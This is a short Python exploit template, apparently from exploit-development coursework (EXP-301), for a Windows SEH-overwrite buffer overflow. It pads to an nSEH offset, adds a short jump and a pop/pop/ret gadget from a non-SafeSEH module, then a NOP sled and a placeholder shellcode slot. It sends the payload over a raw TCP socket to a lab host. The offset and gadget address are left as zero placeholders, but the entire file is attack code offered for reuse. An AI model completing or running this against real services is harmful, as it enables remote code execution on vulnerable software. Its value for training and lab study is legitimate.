#!/usr/bin/env python3
"""EXP-301 SEH overwrite skeleton.
Flow: crash -> check SEH chain (WinDbg: !exchain) -> find offset to nSEH ->
nSEH = short jmp forward, SEH = pop/pop/ret (no SafeSEH module) -> shellcode.
"""
import socket, struct

# ---------- CONFIG ----------
HOST, PORT = "10.10.10.5", 9999
PREFIX, SUFFIX = b"", b"\r\n"
OFFSET_NSEH = 0               # <- offset to nSEH record
# -----------------------------

def p32(v): return struct.pack('<I', v)

POP_POP_RET = 0x00000000      # <- !mona seh -cpb '\x00' (module w/o SafeSEH)
JMP_SHORT   = b"\xeb\x08\x90\x90"   # jmp +0x08 over SEH handler

buf  = b"A" * OFFSET_NSEH
buf += JMP_SHORT              # nSEH
buf += p32(POP_POP_RET)       # SEH handler
buf += b"\x90" * 24
buf += b"\xcc" * 400          # <- shellcode here

s = socket.socket()
s.connect((HOST, PORT))
s.sendall(PREFIX + buf + SUFFIX)
print(f"[+] sent {len(buf)} bytes")
s.close()
